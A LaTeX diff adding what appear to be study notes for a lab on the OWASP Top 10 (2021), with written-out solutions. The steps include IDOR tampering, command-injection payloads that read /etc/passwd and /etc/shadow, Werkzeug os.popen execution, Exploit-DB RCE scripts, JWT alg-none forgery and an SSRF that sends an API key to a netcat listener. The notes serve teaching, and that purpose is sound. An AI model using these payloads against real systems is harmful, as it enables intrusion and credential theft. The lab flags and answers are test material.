@@ -1,0 +1,327 @@
+\addcontentsline{toc}{subsubsection}{OWASP Top 10 - 2021}
+\subsubsection*{OWASP Top 10 - 2021}
+\T{Introduction}{
+The OWASP Top 10 vulnerability issues are the following: 
+\begin{enumerate}
+\item Broken Access Control
+\item Cryptographic Failures
+\item Injection
+\item Insecure Design
+\item Security Misconfiguration
+\item Vulnerable and Outdated Components
+\item Identification and Authentication Failures
+\item Software and Data Integrity Failures
+\item Security Logging \& Monitoring Failures
+\item Server-Side Request Forgery (SSRF)
+\end{enumerate}
+}
+\T{1. Broken Access Control}{
+It is common for websites to have pages not meant to be visited by unauthorized visitors, such as admin pages. When this fails to be kept in place, we speak of a case of Broken Access Control.\\
+If this happens, the possible arising problems are the broken chain of custody of sensitive information (as it can be viewed by non authorized users) and the access to unauthorized functionality.
+}
+\T{Broken Access Control (IDOR Challenge)}{
+An Insecure Direct Object Reference (IDOR) is a specific name for an access control vulnerability where the attacker can see resources they are not allowed or meant to by accessing an exposed Direct Object Reference, i.e an identifier pointing to a specific object, e.g file, user, account, etc. within the server.\\
+An example of this can be the fake URL \cd{https://bank.thm/account?id=111111}. Here we see our id as 111111, but without further security measures we can as well access different ids and see the bank information of other users despite not being authenticated to access that sensitive information.\\
+
+After deploying the machine, we log in with the credentials \cd{noot:test1234}. Once in there, we see the URL \cdnl{http://10.10.28.29/note.php?note\_id=1} and we can alter the query paramter to look at other users' notes.\\
+After setting the query parameter to 0, we see the required flag:
+\F{ flag\{fivefourthree\}}
+}
+\T{2. Cryptographic Failures}{
+Any vulnerability arising from the misuse (including non-use) of cryptographic algorithms to protect sensitive information is categorized as a cryptographic failure.\\
+There are many places a web application may need cryptography.\\
+Taking an email application as an example, we need cryptography when accessing the account to prevent anyone with access to our network traffic to access our credentials.\\
+As this encryption takes place in the data sent between client and server, it is called encrypting data in transit.\\
+There is further encryption needed, as the email service provider is not meant to be able to read the sent or received emails of their users and hence they are stored encrypted. This is called encrypting data at rest.\\
+
+The way to exploit this lack of encryption is ideally a Man In The Middle attack, as sniffing the traffic or redirecting it through a controlled device would result in the access to all communication between target client and server.
+}
+\T{Cryptographic Failures (Supporting Material 1)}{
+Most web applications resort to databases to store the large amount of data they need, and the most common syntax is the Structured Query Language (SQL).\\
+In a production environment, databases are usually stored on dedicated servers, but some targets store their smaller databases as file in their computers. These are called flat-file databases, and are more easily accessible.\\
+In case this database is sotred in a way accessible to any user connecting to the website, they can download it and access all its data locally.\\
+
+This is what we will do in the next challenge using the following commands and general syntax:\\
+We first have to ensure we can access an SQLite database via \cd{sqlite3}. The use syntax is \cd{sqlite3 <database-name>}, which opens a SQLite console.\\
+To see its tables we use the command \cd{.tables}, and to learn what information the database contains, we use \cd{PRAGMA table\_info(<database-name>);}. We then dump its contents with the command \cd{SELECT * FROM <database-name>;}
+}
+\T{Cryptographic Failures (Supporting Material 2)}{
+In a column of the table corresponding to the current task we are going to find some password hashes. In order to decrypt them, we can either use some of the built-in hash crackers (e.g John the Ripper) or \href{https://crackstation.net}{Crackstation}, an online hash cracker tool. Since John the Ripper does not support MD5 per default, we will resort to this online tool and patch the configuration of John at a later instance.
+}
+\T{Cryptographic Failures (Challenge)}{
+Under port 81 of the deployed machine there is a misconfigured website, under whose login page code inspector (\cd{Ctrl+Shift+I}) we see the comment
+\cdnl{<!-- Must remember to do something better with the database than store it in /assets... -->}
+When loading the \cd{/assets} website, we see the \cd{webapp.db} database, which we can download and move to the corresponding Room folder.\\
+We access the database with \cd{sqlite3 webapp.db} and in the console run \cd{.tables} to see the tables ``sessions'' and ``users''.\\
+We see the data the most relevant table, namely users, has, by typing \cd{SELECT * FROM users} and copy the resulting hashes into Crackstation as above.\\
+\QA{
+What is the hash of the admin user?
+}{
+6eea9b7ef19179a06954edd0f6c05ceb
+}
+\QA{
+What is the admin's text plaintext password?
+}{
+qwertyuiop
+}
+We log in as an admin and see the flag:
+\F{THM\{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl\}}
+}
+\T{3. Injection}{
+Injection is the writing of commands or parameters in the fields meant for user input.\\
+Some common examples are SQL and command injection.\\
+SQL injection occurs when user-controlled input is passed to SQL queries without further filtering, allowing an attacker to manipulate the passed queries. This can lead to the attacker accessing or altering information they are not meant to. \\
+On the other hand, command injection happens when user input is passed to system commands, allowing an attacker to execute commands and potentially access systems.\\
+
+The best means against this attack are filters to ensure that any user-controlled input is never passed as a command either using an allow list, i.e comparing the user input against a list of safe inputs and throwing an error if no match os found or stripping the input from any potentially dangerous characters before passing the query.\\
+Both methods can be automated using different libraries.
+}
+\T{3.1. Command Injection}{
+As stated above, command injection happens when the server side interprets user's input as a command interacting with the server-side console. If such an injection is found, an attacker may execute virtually anything at the server side.\\
+
+In the example for this task, there is a web application based on the \cd{cowsay} command on linux. There has been a faulty implementation, though:\\
+\cd{<?php\\
+    if (isset(\$\_GET["mooing"])) \{\\
+        \$mooing = \$\_GET["mooing"];\\
+        \$cow = 'default';\\
+\newline
+        if(isset(\$\_GET["cow"]))\\
+            \$cow = \$\_GET["cow"];\\
+\newline
+        passthru("perl /usr/bin/cowsay -f \$cow \$mooing");\\
+    \}\\
+?>\\
+}
+This code snippet checks if the ``mooing'' and ``cow'' parameters are set and passes the function 
+\cdnl{passthru("perl /usr/bin/cowsay -f \$cow \$mooing");}
+without any further checks, as passthru only executes a command in the OS's console and sends the output back to the user. \\
+We can exploit this by setting the mooing parameter to be any command we want to execute, as we will then read the output in the ``mooing cow'' interface on port 82 of the deployed machine. In order to pass in-line commands, we need to format them as \cd{\$(<command to be executed>)} to ensure this command is run first and its output is then passed as mooing variable and integrated in the rest of the output to be read.
+\QA{
+What strange text file is in the website's root directory?
+}{
+Running \cd{\$(ls)} as mooing variable we see a \textbf{drpepper.txt} file.
+}
+\QA{
+How many non-root/non-service/non-daemon users are there?
+}{
+Either running \cd{\$(cat /etc/shadow)} and seeing it empty or going one by one in the output of the \cd{\$(cat /etc/passwd)} we see there are \textbf{O} non-root/non-service/non-daemon users.
+}
+\QA{
+What user is this app running as?
+}{
+A simple \cd{\$(whoami)} gives us the username \cd{apache}
+}
+\QA{
+What is the user's shell set as?
+}{
+Again in the \cd{/etc/passwd} file, we see the current apache user running its shell (the last part of its corresponding entry) as sbin/nologin
+}
+\QA{
+What version of Alpine Linux is running?
+}{
+Either using the hint and checking \cd{/etc/alpine-release} or running \cd{\$(cat /etc/os-release)} we see the version \textbf{3.16.0}
+}
+}
+\T{4. Insecure Design}{
+An insecure design flaw is an insecurity based on a misconfigured architecture of the app.\\
+Rather than fixing a bit of code, when these vulnerabilities come to happen, often one has to rethink the threat modelling behind the security assessment of the app.\\
+Sometimes these errors are due to a faulty memory of the programmer(s), e.g deactivating security measures when testing the website, but often they are rather due to a bad assessed risk consideration.\\
+In this task, we are going to try and emulate a password reset that happened in Instagram: There, a single IP could try to bruteforce 250 6-figures code to reset the password, but there was no limit to the number of parallel IP addresses attempting such bruteforces, hence allowing an attacker buying 4000 IP addresses to make sure to bypass the security measures.\\
+
+This task, we'll try to use this idea to bypass security measures in a mock login site.\\
+\QA{
+Try to reset \cd{joseph}'s password.
+}{
+On the deployed machine , we access port 85 and click on the ``I forgot my password'' hyperlink. One of the security questions is about ``my favourite colour'', but without limit for the number of attempts an attacker has. After trying red and blue, ``green'' gives the reset of the password. We can then log in as joseph and see all their files.
+}
+\QA{
+What is the value of the flag in joseph's account?
+}{
+Under the ``Private'' tab, we see the \cd{Flag.txt} file, with flag
+\F{THM\{Not\_3ven\_c4tz\_c0uld\_sav3\_U!\}}
+}
+}
+\T{5. Security Misconfiguration}{
+Security Misconfigurations, are similar to insecure design in the sense that they could have been configured right but a poorly thought out conception lead to the target website being insecure. \\
+Among others, the main security misconfigurations are:
+\begin{itemize}
+\item Poorly configured permissions on cloud services, e.g Simple Storage Service (S3) buckets.
+\item Unnecessary enabling of certain features like services, pages, accounts or privileges.
+\item Unchanged default credentials.
+\item Too detailed error systems revealing information about the system.
+\item Not using HTTP security headers.
+\end{itemize}
+This can lead to more vulnerabilities, e.g getting access to higher privileges through default credentials.\\
+
+Debugging Interfaces are meant to help developers test functionalities during the development process. If they are not disabled later on, they pose a dangerous attack vector for potential attackers, see the Patreon hack in 2015.\\
+It took place by abusing an open debug interface for a Werkzeug interface, i.e an interface to execute Pyhton code on the webservers. It can be accessed either via URL on \cd{/console} or presented at some exception raises, in both cases allowing a Python terminal to execute the code. \\
+
+In this task we will access the Werkzeug console and use it to execute the \cd{ls -l} command via 
+\cdnl{import os; print(os.popen("ls -l").read())}
+We then see the files app.py, requirements.txt, templates and todo.db, the database corresponding to the exercise:
+\QA{
+What is the database file name in the current directory?
+}{
+\cd{todo.db}
+}
+Modify the code to read the contents of the app.py file, which contains the application's source code. 
+\QA{
+What is the value of the secret\_flag variable in the source code?
+}{
+Running
+\cdnl{import os; print(os.popen("cat app.py").read())}
+ we see a code line containing the variable \cd{secret\_flag}:
+ \F{THM\{Just\_a\_tiny\_miscofiguration\}}
+}
+}
+\T{6. Vulnerable and Outdated Components}{
+If the target we are pentesting runs a program with a well-known vulnerability, we need to look no further and can start exploiting it.\\
+Sometimes \href{https://www.exploit-db.com/}{Exploit-DB} even has a ready-to-run exploit on the exposed vulnerability, such as \href{https://www.exploit-db.com/exploits/41962}{here} for the WPScan 4.6 exploit in the example.
+}
+\T{Vulnerable and Outdated Components - Exploit}{
+This task advertising an already known vulnerability, we are going to research on vulnerabilities of the software we see on the target.\\
+
+On the example, we see a Nostromo 1.9.6 server, so we look on \href{https://www.exploit-db.com/}{Exploit-DB} for a known vulnerability. Following this case, we find even a ready-to -use exploit and run it without further ado. Unlucky for the example, there is aline we'd have needed to comment out, namely \cd{cve2019\_16278.py}. Fixing it and running the exploit gives the example RCE.\\
+
+Hence, this part of the OWASP Top 10 is more research-focused than anything else, as the work will ``be done for us''
+}
+\T{Vulnerable and Outdated Components - Lab}{
+We see the website on port 84 of the deployed machine and find it to be an online CSE Book Store. Looking for exploits on CSE we don't find much, but googling for RCE CSE bookstore derives us to \href{https://www.exploit-db.com/exploits/47887}{this exploit}, number 47887, which is verified and has a downloadable python exploit in the syntax 
+\cdnl{python 47887.py [target url]}
+which gives us RCE on the server.\\
+There, we see only images in the landing folder, but can see the folder /opt/ via the command \cd{ls /opt/} and after locating the target flag we read and copy it into the answer field via \cd{cat /opt/flag.txt}:
+\F{THM\{But\_1ts\_n0t\_my\_f4ult!\}}
+}
+\T{7. Identification and Authentication Failures}{
+To ensure the security in the authentication measures, i.e in the providing of unique identification via unique cookies to provide an individualized access to the web services. After identifying themselves via a username and password, the server, once the credentials are verified, provides a cookie to be recognised as the user performing the actions.\\
+
+The most common errors when setting these authentication measures are firstly the possibilty of performing brute force attacks against any combination of usernames and passwords in the absence of countermeasures, the allowance of weak credentials, able to be guessed in a small number of attempts, and weak session cookies, which may also be guessed by an attacker if their values are somehow predictable.\\
+
+The coutnermeasures against them are, respectively, an automatic lockout after a certain number of authentication attempts, a strong password policy and multi-factor authentication to avoid a single ``lucky guess'' to be determinant for the access.
+}
+\T{Indentification and Authentication Failures Practical}{
+This practical part will deal with a ``real wordl'' authenticatin mechanism error: the re-registration of an existing user by adding an empty space at the beginning of the name. \\
+Since that string is not registered, the new user is allowed to register to the site, but has access to the same rights and contents as the user without the empty space at the beginning. \\
+A solution for this is the sanitizing of user input, i.e clearing all (leading) spaces and other unrecognised characters.\\
+We make use of this flaw under port 8088 of the deployed machine and access twice in an unauthorized way to darren and arthur's profiles. \\
+\QA{
+What is the flag that you found in darren's account? 
+}{
+\F{fe86079416a21a3c99937fea8874b667}
+}
+\QA{
+What is the flag that you found in arthur's account? 
+}{
+\F{d9ac0f7db4fda460ac3edeb75d75e16e}
+}
+}
+\T{8. Software and Data Integrity Failures}{
+In order for a user to confirm that they are downloading the right piece of software they initially intended, online placed software usually comes with some hashes attached(mostly MD5, SHA-512 and SHA 1). This way, before executing the software downloaded from the trusted source, one can check it has not been tampered with along the way.\\
+
+The main vulnerabilities arising from this lacking integrity take place when using external software without any verification measures. Depending on the kind of software suffering from it, we classify them into Software Integrity Failures and Data Integrity Failures.
+}
+\T{Software Integrity Failures}{
+Software Integrity Failures usually take place when referring to external software in one's website (e.g calling jQuery through \cdnl{<script src=``https://code.jquery.com/jquery-3.6.1.js''></script>}) but without checking that the external server hasn't been corrupted. In this case, any visitor of this website would download the linked file under the provided address involuntarily, potentially downloading malware into their computer.\\
+Hence, the right way of inserting external libraries in the own websits is by providing an extra integrity check as follows:
+\cdnl{<script src=``https://code.jquery.com/jquery-3.6.1.min.js'' integrity=``sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ='' crossorigin=``anonymous''></script>}
+One can check any such Subresource Integrity (SRI) using \href{https://www.srihash.org/}{SRI Hash}.
+\QA{
+What is the SHA-256 hash of \cd{https://code.jquery.com/jquery-1.12.4.min.js}?
+}{
+The answer format is sha256-[SHA-512 string]=, as delivered by SRI Hash, hence the answer we are looking for is
+\cdnl{sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=}
+}
+}
+\T{Data Integrity Failures}{
+In order to mantain sessions, a stateless HTTP(S) website needs to resort to cookies as session tokens to indentify the user: after logging in, they download an indentifying cookie the website then uses to keep track of their user profile.\\
+This use of cookies is problematic if not carried out properly, as weak cookies allow an attacker to impersonate as another user. In order to avoid this, the webservers need to implement some integrity mechanism on the cookies, such as JSON Web Tokens (JWT). JWTs are tokens composed of a Header indentifying the token as such and declaring the signing algorithm applied, a Payload middle part containing the key-value pair composed of username and the data relevant to the website, (e.g the "actual" cookie) and a Signature, taken to ensure the integrity of the hash by using a private key held only by the webserver. If a user alters a JWT, the signature won't match the payload and the JWT will be rejected. Note all three parts are plaintext encoded in Base64.\\
+E.g, a JWT can look like this:\\
+\cd{eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\\
+eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.\\C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw}
+
+As shown in the example, when decoding (using \href{https://appdevtools.com/base64-encoder-decoder}{this tool}) the header and payload of the example token, we see a decoded plaintext in the form:
+\cdnl{\{"typ":"JWT","alg":"HS256"\}\{"username":"guest","exp":1665076836\}}
+
+Some time ago, an attack against JWT tokens was possible by changing the ``alg'' value of the header to ``none'' and removing the signature.\\
+Then, an attacker could modify the payload to show any user they wanted and, as no signature check would take place, they could modify the payload to correspond to any user they'd want. Note that the absence of signature does not imply the absence of the payload-end marking dot.\\
+
+We access port 8089 of the deployed machine and try to log in as guest.\\
+\QA{
+What is guest's account password?
+}{
+As the website suggests itself, we can log in as guest:\textbf{guest}
+}
+If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.
+
+\QA{
+What is the name of the website's cookie containing a JWT token?
+}{
+After logging in, we see a cookie called jwt-session with header \cd{\{"typ":"JWT","alg":"HS256"\}} and payload \cd{\{"username":"guest","exp":1705091949\}}. 
+}
+Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".\\
+\QA{
+What is the flag presented to the admin user?
+}{
+We change the algorithm of the cookie to "none", change "guest" for "admin" and delete the signature. We then refresh the site and see the flag
+\F{THM\{Dont\_take\_cookies\_from\_strangers\}}
+}
+
+}
+\T{9. Security Logging and Monitoring Failures}{
+As a healthy measure when managing a website, it is strongly recommended to log every action performed by its users. This way, any potential threats can be recognised and attackers' activities can be traced if a security breach should happen.Of course, one always hopes to not need the logs as that would mean that any activity monitoring in place is working properly.\\
+On legal grounds it is also compulsory to know which actions were performed by the attackers, especially relating to personally identifiable user information.\\
+Furthermore, if the actions of an attacker are not logged, the client would have no way of knowing if further attacks are possible.\\
+Log information should contain:\\
+\begin{itemize}
+\item HTTP status codes
+\item Time Stamps
+\item Usernames
+\item API endpoints / page locations
+\item IP addresses
+\end{itemize}
+As this can be sensitive and security relevant information, they have to be safely stored and redundancy must be ensured.\\
+Common examples of attack patterns are, among others, multiple unauthorised attempts for some action (especially authentication attempts), indicating a brute force attempt; requests from anomalous IPs or locations (nonetheless prone to be a false positive); use of automated tools, recognisable by the speed of the requests or the User-Agent values; and the employment of common or well-known payloads.\\
+For a later security assessment, these activities need to be assigned a security rating.\\
+
+For the questions of this task, we download a text file containing log information on a website, where multiple unauthorised login attempts took place from the same IP one after the other. We then assume this to be the suspicious activity we are looking for.\\
+\QA{
+What IP address is the attacker using?
+}{
+49.99.13.16
+}
+\QA{
+What kind of attack is being carried out?
+}{
+brute force
+}
+}
+\T{10. Server-Side Request Forgery (SSRF)}{
+This last vulnerability type happens when an attacker can force a web application to send requests whose contents they control and usually are due to the web application using external services.\\
+
+The example provided in this task is the one of a web application resorting to an external Application Program Interface to send SMS to its cloents.This SMS webserver would assign an authentication token to know who to charge for the sent SMS.\\
+
+The security flaw of this task resides in the server parameter being exposed, hence allowing an attacker to change it to a server they control, which the web application would positively respond to, hence providing the attacker their API key and allowing them to impersonate the webserver.\\
+This last part could happen via a netcat listening port on the attacker's server to read the API key on the HTTP request. \\
+
+Further uses of SSRF include enumerating of internal networks, addresses and ports; abusing trust relationships to gain further unauthorised acccesses and gaining RCE on other non-HTTP services.\\
+
+On the practical side of this task we access port 8087 of the deployed machine. We'll see an admin area to which we'll devote all of our efforts.\\
+
+We see this area under the right bar and ``Admin Area'' or under \cd{IP:8087/admin}, but it is only accessible from a so-called ``localhost''.\\
+We then check the ``Download Resume'' button, as instructed, and see it points to \cd{http://10.10.35.166:8087/download?server=secure-file-storage.com:8087\&id=75482342}\\
+We start Burp and a netcat listener on our device via \cd{nc -lvp 8087} on port 8087, intercept the request that arises when clicking to download the resume and change it to our own local IP:8087. Then, the netcat listener we had activated should give us the following output:\\
+\cd{
+Listening on 0.0.0.0 8087\\
+Connection received on 10.10.35.166 49794\\
+GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1\\
+Host: 10.11.58.131:8087\\
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0\\
+Accept: */*\\
+X-API-KEY: THM\{Hello\_Im\_just\_an\_API\_key\}\\
+}
+
+With that API key we should be able to impersonate the webapp we targeted and we are done.\\
+As an extra task, we are commanded to try and access the admin site.\\
+We know the only host allowed to access the admin are is ``localhost'', so we redirect the location to localhost:8087/admin\#\&id=75482342, but to use the obfuscation and break up server and id we need to "escape the \# " encoding it as URL's \% 23 and insert it into the URL. We'd then see the flag 
+\F{THM\{c4n\_i\_haz\_flagz\_plz?\}}
+}
